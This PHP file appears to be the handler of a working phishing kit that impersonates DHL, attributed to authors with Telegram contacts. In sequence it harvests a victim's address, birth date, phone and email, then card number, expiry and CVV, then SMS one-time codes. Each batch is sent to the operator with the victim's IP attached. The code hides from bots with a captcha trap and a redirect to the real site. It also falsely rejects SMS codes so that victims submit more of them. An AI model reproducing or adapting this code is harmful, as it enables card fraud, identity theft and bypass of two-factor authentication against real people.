<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact us on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('index');
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms2' ) {
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=2&verification#_");
            exit();
        }
        if( $red == 'success' ) {
            header("Location: " . OFFICIAL_WEBSITE);
            exit();
        }
        $page = go($red);
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "details") {
            $_SESSION['errors']      = [];
            $_SESSION['address']    = $_POST['address'];
            $_SESSION['zip_code']   = $_POST['zip_code'];
            $_SESSION['city']       = $_POST['city'];
            $_SESSION['birth_date'] = $_POST['birth_date'];
            $_SESSION['phone']      = $_POST['phone'];
            $_SESSION['email']      = $_POST['email'];
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = 'Please enter a valid name';
            }
            if( empty($_POST['zip_code']) ) {
                $_SESSION['errors']['zip_code'] = 'Please enter a valid zip code';
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = 'Please enter a valid city';
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = 'Please enter a valid date';
            }
            if( validate_number($_POST['phone']) == false ) {
                $_SESSION['errors']['phone'] = 'Please enter a valid phone number';
            }
            if( validate_email($_POST['email']) == false ) {
                $_SESSION['errors']['email'] = 'Please enter a valid email address';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | DHL | Details';
                $message = '/-- DETAILS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Zip code : ' . $_POST['zip_code'] . "\r\n";
                $message .= 'City : ' . $_POST['city'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
                $message .= 'Email : ' . $_POST['email'] . "\r\n";
                $message .= '/-- END DETAILS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                $page = go('loading1');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('details');
                header("Location: " . $page['path'] . "?error#_");
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['name']   = $_POST['name'];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_SESSION['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( validate_name($_POST['name']) == false ) {
                $_SESSION['errors']['name'] = 'Please enter a valid name';
            }
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Please enter a valid card number';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Please enter a valid date';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'Please enter a valid security code';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | DHL | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Name : ' . $_POST['name'] . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                $page = go('details');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('cc');
                header("Location: " . $page['path'] . "?error#_");
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            $_SESSION['pin']   = $_POST['pin'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'Code is not valid.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | DHL | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $_SESSION['errors']['sms_code'] = 'Code is not valid.';
                $page = go('loading2');
                header("Location: " . $page['path'] . "?error=$error&verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                $page = go('sms');
                header("Location: " . $page['path'] . "?error=$error&verification#_");
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>